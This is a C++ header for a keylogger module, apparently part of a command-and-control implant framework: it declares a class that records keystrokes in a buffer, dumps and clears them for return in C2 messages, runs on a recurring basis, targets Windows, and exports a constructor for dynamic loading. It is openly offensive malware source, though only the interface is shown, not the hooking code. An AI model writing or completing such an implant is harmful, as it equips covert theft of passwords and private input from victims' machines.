#pragma once

#include "ModuleCmd.hpp"
#include <mutex>


class KeyLogger : public ModuleCmd
{

public:
	KeyLogger();
	~KeyLogger();

	std::string getInfo();

	int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
	int process(C2Message& c2Message, C2Message& c2RetMessage);
	int errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg);
	int recurringExec(C2Message& c2RetMessage);
	int followUp(const C2Message &c2RetMessage);
	int osCompatibility() 
	{
        return OS_WINDOWS;
    }

	bool getIsThreadLaunched()
	{
		return m_isThreadLaunched;
	}

	int setKey(char charPressed)
	{
		std::lock_guard<std::mutex> guard(m_mutex);
		m_saveKeyStrock.push_back(charPressed);
		return 0;
	}

	int dumpKeys(std::string& output)
	{
		std::lock_guard<std::mutex> guard(m_mutex);
		output = m_saveKeyStrock;
		m_saveKeyStrock.clear();
		return 0;
	}
	
private:
 	int threadID; 
	bool m_isThreadLaunched;
	std::string m_saveKeyStrock;
	std::mutex m_mutex;

	static void run(void* keyLoggerPtr);

};


#ifdef _WIN32

extern "C" __declspec(dllexport) KeyLogger * KeyLoggerConstructor();

#else

extern "C"  __attribute__((visibility("default"))) KeyLogger * KeyLoggerConstructor();

#endif
